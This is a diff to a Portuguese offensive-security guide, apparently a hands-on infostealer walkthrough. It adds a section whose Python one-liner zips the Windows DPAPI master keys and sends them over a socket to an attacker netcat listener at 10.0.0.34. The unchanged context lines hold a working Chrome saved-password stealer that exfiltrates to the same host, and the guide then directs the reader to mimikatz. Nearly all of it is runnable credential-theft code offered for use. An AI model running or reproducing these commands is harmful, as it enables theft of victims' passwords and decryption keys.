@@ -262,12 +262,13 @@ nc -lvnp 9999 > chrome_passwords.txt
 python -c "import os, sqlite3, shutil, tempfile, socket; login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data'; temp_db = tempfile.mktemp(suffix='.db'); shutil.copy2(login_data, temp_db); conn = sqlite3.connect(temp_db); cursor = conn.cursor(); cursor.execute('SELECT origin_url, username_value, password_value FROM logins'); result = ''; [result := result + f'URL: {url}\nUser: {user}\nPass: {pwd.hex()}\n\n' for url, user, pwd in cursor.fetchall()]; conn.close(); os.unlink(temp_db); s = socket.socket(); s.settimeout(5); s.connect(('10.0.0.34', 9999)); s.send(result.encode() if result else b'NO_PASSWORDS_FOUND'); s.close(); print('Enviado:', len(result), 'bytes')"
 ```
 
-### SHELL DO ATACANTE
+### 6.1. InfoStealer - Extrair senha criptografada
+### No shell do atacante
 ``` cmd
 nc -lvnp 9999 | tee passwords_full.json
 ```
 
-### SHELL DA VITIMA
+### No shell da vitima
 ``` cmd
 echo import os, sqlite3, shutil, tempfile, socket, subprocess, json, base64 > %TEMP%\final_v2.py
 echo. >> %TEMP%\final_v2.py
@@ -310,9 +311,20 @@ echo     print('ENVIADO!') >> %TEMP%\final_v2.py
 echo except Exception as e: >> %TEMP%\final_v2.py
 echo     print(f'Erro envio: {e}') >> %TEMP%\final_v2.py
 ```
-### DEPOIS RODE
+### Depois rode na vitima
 ``` cmd
 python %TEMP%\final_v2.py
 ```
 
+### 6.2. InfoStealer - Extrair blob DPAPI descriptografado
 
+### Estrair as Master Key do Navegador Chrome
+### No shell do atacante
+``` cmd
+nc -lvnp 9999 > master_keys.zip
+```
+### No shell da vitima
+``` cmd
+python -c "import os, socket, shutil; protect_path = os.environ['APPDATA'] + r'\Microsoft\Protect'; shutil.make_archive(r'%TEMP%\master_keys', 'zip', protect_path); s = socket.socket(); s.connect(('10.0.0.34', 9999)); f = open(r'%TEMP%\master_keys.zip', 'rb'); s.send(f.read()); f.close(); s.close(); print('Master Keys enviadas!')"
+```
+### 7.0. AGORA É COM VOCÊ USE (MIMIKTZ) github.com/gentilkiwi/mimikatz
